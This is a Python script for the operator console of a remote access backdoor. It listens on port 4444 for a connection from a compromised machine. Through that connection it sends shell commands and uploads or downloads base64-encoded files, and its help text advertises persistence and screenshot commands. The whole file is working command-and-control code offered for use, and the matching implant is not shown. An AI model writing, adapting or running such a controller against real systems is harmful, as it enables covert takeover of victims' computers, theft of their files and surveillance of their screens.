#!/usr/bin/python
import base64
import json
import socket


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.sendall(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                chunk = self.connection.recv(4096)
                if not chunk:
                    raise ConnectionError("Connection closed")
                json_data += chunk
                return json.loads(json_data.decode())
            except (ValueError, json.JSONDecodeError):
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def write_file(self, path, content):
        if isinstance(content, str):
            content = base64.b64decode(content)
        with open(path, "wb") as file:
            file.write(content)
        return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def run(self):
        while True:
            command = input(">> ").strip()
            if not command:
                continue
            parts = command.split()
            if parts[0] == "help":
                print("Available commands: help, system_info, persist, screenshot, cd, upload, download, exit")
                continue
            if parts[0] == "upload":
                if len(parts) < 3:
                    print("Usage: upload <local_file> <remote_path>")
                    continue
                file_content = self.read_file(parts[1])
                result = self.execute_remotely(["upload", parts[2], file_content])
            elif parts[0] == "download":
                if len(parts) < 2:
                    print("Usage: download <remote_file>")
                    continue
                result = self.execute_remotely(["download", parts[1]])
                if isinstance(result, str):
                    self.write_file(parts[1], result)
                    print("[+] Download successful.")
                    continue
            elif parts[0] == "screenshot":
                result = self.execute_remotely(["screenshot"])
                if isinstance(result, str) and result.startswith("[") is False:
                    print(f"[+] Screenshot saved at: {result}")
                    self.execute_remotely(["download", result])
                    continue
                print(result)
                continue
            elif parts[0] == "exit":
                self.execute_remotely(["exit"])
                break
            else:
                result = self.execute_remotely(parts)
            print(result)


my_listener = Listener("0.0.0.0", 4444)
my_listener.run()
